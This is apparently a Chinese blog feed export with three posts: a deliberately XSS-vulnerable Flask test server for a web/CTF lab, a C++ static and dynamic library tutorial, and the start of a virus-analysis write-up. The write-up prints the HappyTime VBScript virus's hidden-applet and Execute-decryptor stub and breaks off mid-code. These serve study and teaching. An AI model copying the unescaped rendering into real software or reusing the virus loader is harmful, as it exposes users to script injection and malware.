class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># !/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># @time: 2020/04/12</span></span><br><span class="line"><span class="comment"># @Author:Magic</span></span><br><span class="line"><span class="comment"># @File:xss_test_server.py</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask,render_template,request,redirect,url_for</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">comment = []</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/', methods=["GET","POST"])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">()</span>:</span></span><br><span class="line">4<span class="keyword">return</span> render_template(<span class="string">"XSS.html"</span>, comment=comment, query=<span class="literal">None</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># Realize the Reflected XSS attack Vulnerable Search box</span></span><br><span class="line"><span class="meta">@app.route('/rxss', methods=["GET","POST"])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rxss</span><span class="params">()</span>:</span></span><br><span class="line">4<span class="keyword">if</span> request.method == <span class="string">"GET"</span>:</span><br><span class="line">44qdata = request.args.get(<span class="string">'query'</span>)</span><br><span class="line">44action = request.args.get(<span class="string">'anti-XSS'</span>)</span><br><span class="line">4<span class="keyword">if</span> <span class="keyword">not</span> action:</span><br><span class="line">44action = <span class="number">0</span></span><br><span class="line">4print(request.args)</span><br><span class="line">4<span class="keyword">if</span> int(action):</span><br><span class="line">44qdata = escape(qdata)</span><br><span class="line">4print(qdata)</span><br><span class="line">4<span class="keyword">return</span> render_template(<span class="string">"XSS.html"</span>, query=qdata)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># Realize the Persistent XSS attack Vulnerable Comment</span></span><br><span class="line"><span class="meta">@app.route('/pxss', methods=["GET","POST"])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pxss</span><span class="params">()</span>:</span></span><br><span class="line">4<span class="keyword">if</span> request.method == <span class="string">"POST"</span>:</span><br><span class="line">44qcomment = request.form.get(<span class="string">'qcomment'</span>)</span><br><span class="line">44action = request.form.get(<span class="string">'anti-XSS'</span>)</span><br><span class="line">4<span class="keyword">global</span> comment</span><br><span class="line">4<span class="keyword">if</span> <span class="keyword">not</span> action:</span><br><span class="line">44action = <span class="number">0</span></span><br><span class="line">4print(request.form)</span><br><span class="line">4<span class="keyword">if</span> int(action):</span><br><span class="line">44qcomment = escape(qcomment)</span><br><span class="line">4comment.append(qcomment)</span><br><span class="line">4print(comment)</span><br><span class="line">4<span class="comment">#return render_template("XSS.html", comment=comment)</span></span><br><span class="line">4<span class="keyword">return</span> redirect(url_for(<span class="string">'index'</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 检查字符串是否含有标签并编码</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">escape</span><span class="params">(s, quote=True)</span>:</span></span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">    Replace special characters "&amp;", "&lt;" and "&gt;" to HTML-safe sequences.</span></span><br><span class="line"><span class="string">    If the optional flag quote is true (the default), the quotation mark</span></span><br><span class="line"><span class="string">    characters, both double quote (") and single quote (') characters are also</span></span><br><span class="line"><span class="string">    translated.</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    s = s.replace(<span class="string">"&amp;"</span>, <span class="string">"&amp;amp;"</span>) <span class="comment"># Must be done first!</span></span><br><span class="line">    s = s.replace(<span class="string">"&lt;"</span>, <span class="string">"&amp;lt;"</span>)</span><br><span class="line">    s = s.replace(<span class="string">"&gt;"</span>, <span class="string">"&amp;gt;"</span>)</span><br><span class="line">    <span class="keyword">if</span> quote:</span><br><span class="line">        s = s.replace(<span class="string">'"'</span>, <span class="string">"&amp;quot;"</span>)</span><br><span class="line">        s = s.replace(<span class="string">'\''</span>, <span class="string">"&amp;#x27;"</span>)</span><br><span class="line">    <span class="keyword">return</span> s</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">4app.run(debug=<span class="literal">True</span>, port=<span class="number">12345</span>)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Link-Library-of-C++</title>
      <link href="/2020/03/30/Link-Library-of-C/"/>
      <url>/2020/03/30/Link-Library-of-C/</url>
      
        <content type="html"><![CDATA[<h1 id="0x00-序"><a href="#0x00-序" class="headerlink" title="0x00 序"></a>0x00 序</h1><blockquote><p><a href="https://www.runoob.com/w3cnote/cpp-static-library-and-dynamic-library.html" target="_blank" rel="noopener">https://www.runoob.com/w3cnote/cpp-static-library-and-dynamic-library.html</a></p><p><a href="https://zhuanlan.zhihu.com/p/32615811" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/32615811</a></p><p><a href="https://www.cnblogs.com/WindSun/p/11287927.html" target="_blank" rel="noopener">https://www.cnblogs.com/WindSun/p/11287927.html</a></p></blockquote><p>在写关于病毒程序之前，忽然想学习一下有关C++库文件的编写</p><p>库，是可复用代码的集合</p><p>总所周知，库文件分为静态链接库和动态链接库，两者有一定的区别</p><p><img src="https://magic-king.net/images/loading.gif" data-original="Link-Library-of-C/Compile.png" alt></p><p>静态链接库在编译时，就通过链接成为可执行文件的一部分，简单来说，就是将库函数融入目标程序内，即使目标程序没有和库文件在一起也能运行；而动态链接库是在程序运行时调用的，其库并没有融入目标程序内，运行时可以随意加载和移除，节省内存空间。</p><p>动态链接库和静态链接库的<strong>相同点是它们都实现了代码的共享，不同点是静态链接库文件中的代码被包含目标程序中，该lib中不能再包含其他动态链接或者静态链接的库了。而动态链接库可以被调用的目标程序动态地“引用”和“卸载”，一个动态链接库中可以包含其他动态链接库或者静态链接库</strong>。在大型的软件项目中一般要实现很多功能，如果把所有单独的功能写成一个个lib文件的话，程序运行的时候要占用很大的内存空间，导致运行缓慢；但是如果将功能写成dll文件，就可以在用到该功能的时候调用功能对应的dll文件，不用这个功能时将dll文件移除内存，这样可以节省内存空间。</p><ul><li>在Win下，动态库以<code>.dll</code>结尾，静态库以<code>.lib</code>结尾。</li><li>在Linux下，动态库文件以<code>.so</code>结尾，静态库以<code>.a</code>结尾。</li><li>在Mac下，动态库以<code>.dylib</code>结尾，静态库以<code>.a</code>结尾。</li></ul><h2 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h2><h4 id="静态库-lib"><a href="#静态库-lib" class="headerlink" title="静态库(.lib)"></a>静态库(.lib)</h4><p>libTest.h</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> _TEST_H</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _TEST_H</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">test_add</span><span class="params">(<span class="keyword">int</span> x, <span class="keyword">int</span> y)</span></span>;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br></pre></td></tr></table></figure><p>libTest.cpp</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"libTest.h"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="comment">//using namespace std;</span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">test_add</span><span class="params">(<span class="keyword">int</span> x, <span class="keyword">int</span> y)</span></span>&#123;</span><br><span class="line">4<span class="keyword">int</span> sum;</span><br><span class="line">4sum = x + y;</span><br><span class="line">4<span class="keyword">return</span> sum;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后windows下需要配合VS命令行(我没内存卸了XD)，或者vs studio里面可以直接生成</p><p>使用静态库也可在里面配置</p><h5 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h5><p>main.cpp</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"libTest.h"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> comment(lib,<span class="meta-string">"libTest.lib"</span>) <span class="comment">//加入链接库</span></span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">4<span class="keyword">int</span> sum;</span><br><span class="line">4sum = test_add(<span class="number">1</span>, <span class="number">2</span>);</span><br><span class="line">4<span class="built_in">cout</span> &lt;&lt; sum &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">4system(<span class="string">"pause"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="动态库-dll"><a href="#动态库-dll" class="headerlink" title="动态库(.dll)"></a>动态库(.dll)</h4><p>dllGen.h</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> _MYADD_H</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _MYADD_H</span></span><br><span class="line">__declspec(dllexport) <span class="function"><span class="keyword">int</span> <span class="title">test_add</span><span class="params">(<span class="keyword">int</span> x, <span class="keyword">int</span> y)</span></span>;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br></pre></td></tr></table></figure><p>注：导出函数的声明方式有两种，一种如上所示，另一种采用模块定义(.def)文件声明，具体上网搜</p><p>dllGen.cpp</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"dllGen.h"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">test_add</span><span class="params">(<span class="keyword">int</span> x, <span class="keyword">int</span> y)</span></span>&#123;</span><br><span class="line">4<span class="keyword">int</span> sum;</span><br><span class="line">4sum = x + y;</span><br><span class="line">4<span class="keyword">return</span> sum;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="使用-1"><a href="#使用-1" class="headerlink" title="使用"></a>使用</h5><p>main.cpp</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">//定义一个与myadd函数接受参数类型和返回</span></span><br><span class="line"><span class="comment">//值均相同的函数指针类型</span></span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">int</span><span class="params">(*lpAddFun)</span><span class="params">(<span class="keyword">int</span>, <span class="keyword">int</span>)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">4HINSTANCE hDll;<span class="comment">//句柄</span></span><br><span class="line">4lpAddFun addFun;<span class="comment">//函数指针</span></span><br><span class="line">4hDll = LoadLibrary(<span class="string">"dllGenTest.dll"</span>);<span class="comment">//动态加载DLL模块句柄</span></span><br><span class="line">4<span class="keyword">if</span> (hDll == <span class="literal">NULL</span>)&#123;</span><br><span class="line">44FreeLibrary(hDll);</span><br><span class="line">4&#125;</span><br><span class="line"> </span><br><span class="line">4<span class="comment">//addFun = (lpAddFun)GetProcAddress(hDll, "myadd"); //通过函数名获取函数的地址，没有运行</span></span><br><span class="line">4addFun = (lpAddFun)GetProcAddress(hDll, MAKEINTRESOURCE(<span class="number">1</span>)); <span class="comment">//通过函数的序号获取函数的地址，work</span></span><br><span class="line">4</span><br><span class="line">4<span class="keyword">if</span> (addFun == <span class="literal">NULL</span>)&#123;</span><br><span class="line">44FreeLibrary(hDll);</span><br><span class="line">4&#125;</span><br><span class="line"> </span><br><span class="line">4<span class="keyword">int</span> result;</span><br><span class="line">4result = addFun(<span class="number">22</span>,<span class="number">33</span>);</span><br><span class="line">4<span class="built_in">cout</span> &lt;&lt; result &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">4system(<span class="string">"pause"</span>);</span><br><span class="line">    </span><br><span class="line">4FreeLibrary(hDll);</span><br><span class="line">4<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h2><h4 id="静态库-a"><a href="#静态库-a" class="headerlink" title="静态库(.a)"></a>静态库(.a)</h4><p>add.h</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> ADD_H</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ADD_H</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">add</span><span class="params">(<span class="keyword">int</span> x,<span class="keyword">int</span> y)</span></span>; </span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br></pre></td></tr></table></figure><p>add.c</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"add.h"</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">add</span><span class="params">(<span class="keyword">int</span> x, <span class="keyword">int</span> y)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> (x + y);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>sub.h</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> _SUB_H_ </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _SUB_H_  </span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sub</span><span class="params">(<span class="keyword">int</span> x, <span class="keyword">int</span> y)</span></span>;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br></pre></td></tr></table></figure><p>sub.c</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"sub.h"</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sub</span><span class="params">(<span class="keyword">int</span> x, <span class="keyword">int</span> y)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> (x - y);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>main.c</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"sub.h"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"add.h"</span></span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> a, b;</span><br><span class="line">    a = add(<span class="number">1</span>, <span class="number">2</span>);</span><br><span class="line">    b = sub(<span class="number">10</span>, <span class="number">5</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"a = % d, b = % d\n"</span>, a, b);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>不管是静态函数库还是动态函数库，都是由*.o目标文件生成。</p><p>所以先复制代码</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ gcc -c add.c </span><br><span class="line">$ gcc -c sub.c</span><br></pre></td></tr></table></figure><p>生成<code>add.o</code>、 <code>sub.o</code></p><p>静态函数库由ar命令创建</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ ar -crv libTest.a add.o sub.o</span><br></pre></td></tr></table></figure><blockquote><p> <strong>参数：</strong></p><p><strong>-c</strong> create的意思</p><p><strong>-r</strong> replace的意思，表示当插入的模块名已经在库中存在，则替换同名的模块。如果若干模块中有一个模块在库中不存在，ar显示一个错误消息，并不替换其他同名模块。默认的情况下，新的成员增加在库的结尾处，可以使用其他任选项来改变增加的位置。</p></blockquote><p>到此静态函数库创建完毕。</p><h5 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h5><p>通过</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ gcc -o main main.cpp -L. -lTest</span><br></pre></td></tr></table></figure><p>编译main.c就会把静态函数库整合进main。</p><blockquote><p><strong>参数：</strong></p><p>-L 指定静态函数库的位置供查找，注意L后面还有’.’，表示静态函数库在本目录下查找。</p><p>-l 则指定了静态函数库名，由于静态函数库的命名方式是lib*.a，<strong>其中的lib和.a忽略。</strong></p></blockquote><p>根据静态函数库的特性，此处删除libaddsub.a后main依然可以运行，因为静态库的内容已经整合进去了。</p><h4 id="动态库-so"><a href="#动态库-so" class="headerlink" title="动态库(.so)"></a>动态库(.so)</h4><p>直接用上面代码编译，选用gcc选项即可</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ gcc -shared -fpic -o libTest.so add.cpp sub.cpp</span><br></pre></td></tr></table></figure><blockquote><p><strong>参数</strong></p><p>-fpic：产生位置无关代码</p><p>-shared：生成共享库</p></blockquote><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ gcc -o out main.cpp -L. -lTest</span><br></pre></td></tr></table></figure><p>此时还不能立即<code>./out</code>，因为在动态函数库使用时，会查找/usr/lib /lib目录下的动态函数库，而此时我们生成的库不在里边。</p><p>这个时候有以下几种办法可以让他成功运行：</p><ul><li><p>最直接最简单的方法就是把<code>libaddsub.so</code>拉到<code>/usr/lib</code> 或<code>/lib</code>中去。</p></li><li><p>还有一种方法,假设<code>libTest.so</code>在<code>/home/linux/Test</code></p></li></ul><p><code>export LD_LIBRARY_PATH=/home/linux/Test:$LD_LIBRARY_PATH</code></p><ul><li>另外还可以在<code>/etc/ld.so.conf</code>文件里加入我们生成的库的目录，然后<code>/sbin/ldconfig</code>。</li></ul><blockquote><p><code>/etc/ld.so.conf</code>是非常重要的一个目录，里面存放的是链接器和加载器搜索共享库时要检查的目录，默认是从<code>/usr/lib /lib</code>中读取的，所以想要顺利运行，我们也可以把我们库的目录加入到这个文件中并执行<code>/sbin/ldconfig</code>。</p></blockquote><blockquote><p>g++(gcc)编译选项</p><ul><li><p>-c ： 仅编译源代码但不执行链接，输出结果为对象文件，即<code>.o</code></p></li><li><p>-shared ：指定生成动态链接库。</p></li><li><p>-static ：指定生成静态链接库。</p></li><li><p>-fPIC ：表示编译为位置独立的代码，用于编译共享库。目标文件需要创建成位置无关码，念上就是在可执行程序装载它们的时候，它们可以放在可执行程序的内存里的任何地方。</p></li><li><p>-L. ：表示要连接的库所在的目录。</p></li><li><p>-l：指定链接时需要的动态库。编译器查找动态连接库时有隐含的命名规则，即在给出的名字前面加上lib，后面加上.a/.so来确定库的名称。</p></li><li><p>-Wall ：生成所有警告信息。</p></li><li><p>-ggdb ：此选项将尽可能的生成gdb的可以使用的调试信息。</p></li><li><p>-g ：编译器在编译的时候产生调试信息。</p></li><li><p>-c ：只激活预处理、编译和汇编,也就是把程序做成目标文件(.o文件)。</p></li><li><p>-Wl,options ：把参数(options)传递给链接器ld。如果options中间有逗号,就将options分成多个选项,然后传递给链接程序。</p></li></ul><hr><ul><li><strong>ldd</strong>命令可以查看一个可执行程序依赖的共享库**</li></ul></blockquote>]]></content>
      
      
      <categories>
          
          <category> C++ </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Computer-Virus</title>
      <link href="/2020/03/30/Computer-Virus/"/>
      <url>/2020/03/30/Computer-Virus/</url>
      
        <content type="html"><![CDATA[<h1 id="0x00-序"><a href="#0x00-序" class="headerlink" title="0x00 序"></a>0x00 序</h1><p>最近新型冠状病毒肆虐全球，然后我发现林老师的课紧随时事，上次刚了解完熔断，这次便来了病毒</p><p>所谓计算机病毒，无非也就是一段程序，只不过这个程序是用来进行传播感染破坏而已，借用wiki中的定义，电脑病毒具有的不良特征有传播性、隐蔽性、感染性、潜伏性、可激发性、表现性或破坏性，通常表现两种以上所述的特征就可以认定该程序是病毒。</p><p>计算机病毒的生命周期为开发期→传染期→潜伏期→发作期→发现期→消化期→消亡期</p><blockquote><p>资料：</p><p><a href="https://zh.wikipedia.org/wiki/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%97%85%E6%AF%92" target="_blank" rel="noopener">计算机病毒-wiki</a></p></blockquote><h4 id="计算机病毒的分类"><a href="#计算机病毒的分类" class="headerlink" title="计算机病毒的分类"></a>计算机病毒的分类</h4><ul><li>木马病毒：比如rootkit，特洛伊木马</li><li>二进制病毒（即wiki中的有害软件）：比如蠕虫病毒，冲击波病毒，震荡波病毒</li><li>脚本病毒：比如宏病毒</li></ul><h1 id="病毒分析"><a href="#病毒分析" class="headerlink" title="病毒分析"></a>病毒分析</h1><p>然后应实验要求我们来做些病毒分析</p><h2 id="脚本病毒"><a href="#脚本病毒" class="headerlink" title="脚本病毒"></a>脚本病毒</h2><p>所谓脚本病毒，就是用脚本语言设计的计算机病毒，流行的脚本语言比如javascript以及vbscript</p><h4 id="vbs"><a href="#vbs" class="headerlink" title="vbs"></a>vbs</h4><blockquote><p><a href="https://www.cnblogs.com/aland-1415/p/7147264.html" target="_blank" rel="noopener">vbs基本语法</a></p><p><a href="https://www.runoob.com/vbscript/vbscript-ref-functions.html" target="_blank" rel="noopener">vbScript_function</a></p></blockquote><p><code>msgbox &quot;strings&quot;</code>：弹出对话框</p><p>在IE11之后，不支持htm内嵌<code>vbscript</code></p><h3 id="happytime病毒"><a href="#happytime病毒" class="headerlink" title="happytime病毒"></a>happytime病毒</h3><blockquote><p><a href="https://github.com/amg1127/virus_VBS-Haptime/blob/master/haptime.vbs" target="_blank" rel="noopener">Github-amg1127 / virus_VBS-Haptime</a></p><p><a href="https://blog.csdn.net/tchaikov/article/details/4498" target="_blank" rel="noopener">浅析欢乐时光（HAPPY TIME）病毒</a></p></blockquote><p>之前是把病毒内嵌进入html中，当加载html时执行了<code>vbscript</code>脚本，类似于现在html自动执行<code>javascript</code>脚本</p><p>大概病毒文件长下面这个样，由于密文过长就不粘贴了，然后通过execute执行解密函数</p><p>加密的算法是先生成四个算子，每个字符减去对应的算子，解密时再按顺序加回来</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">script language=vbscript&gt;</span><br><span class="line">document.write "<span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">'position:absolute; left:0px; top:0px; width:0px; height:0px; z-index:28; visibility: hidden'</span>&gt;</span><span class="tag">&lt;<span class="name">"&amp;"APPLET</span> <span class="attr">NAME</span>=<span class="string">KJ</span>"&amp;"<span class="attr">_guest</span> <span class="attr">HEIGHT</span>=<span class="string">0</span> <span class="attr">WIDTH</span>=<span class="string">0</span> <span class="attr">code</span>=<span class="string">com.ms.</span>"&amp;"<span class="attr">activeX.Active</span>"&amp;"<span class="attr">XComponent</span>&gt;</span><span class="tag">&lt;/<span class="name">APPLET</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span>"</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">language</span>=<span class="string">vbscript</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="actionscript">ExeString = <span class="string">"Encrypto Strings"</span></span></span><br><span class="line"><span class="actionscript">Execute(<span class="string">"Dim KeyArr(3),ThisText"</span>&amp;vbCrLf&amp;<span class="string">"KeyArr(0) = 1"</span>&amp;vbCrLf&amp;<span class="string">"KeyArr(1) = 3"</span>&amp;vbCrLf&amp;<span class="string">"KeyArr(2) = 4"</span>&amp;vbCrLf&amp;<span class="string">"KeyArr(3) = 8"</span>&amp;vbCrLf&amp;<span class="string">"For i=1 To Len(ExeString)"</span>&amp;vbCrLf&amp;<span class="string">"TempNum = Asc(Mid(ExeString,i,1))"</span>&amp;vbCrLf&amp;<span class="string">"If TempNum = 18 Then"</span>&amp;vbCrLf&amp;<span class="string">"TempNum = 34"</span>&amp;vbCrLf&amp;<span class="string">"End If"</span>&amp;vbCrLf&amp;<span class="string">"TempChar = Chr(TempNum + KeyArr(i Mod 4))"</span>&amp;vbCrLf&amp;<span class="string">"If TempChar = Chr(28) Then"</span>&amp;vbCrLf&amp;<span class="string">"TempChar = vbCr"</span>&amp;vbCrLf&amp;<span class="string">"ElseIf TempChar = Chr(29) Then"</span>&amp;vbCrLf&amp;<span class="string">"TempChar = vbLf"</span>&amp;vbCrLf&amp;<span class="string">"End If"</span>&amp;vbCrLf&amp;<span class="string">"ThisText = ThisText &amp; 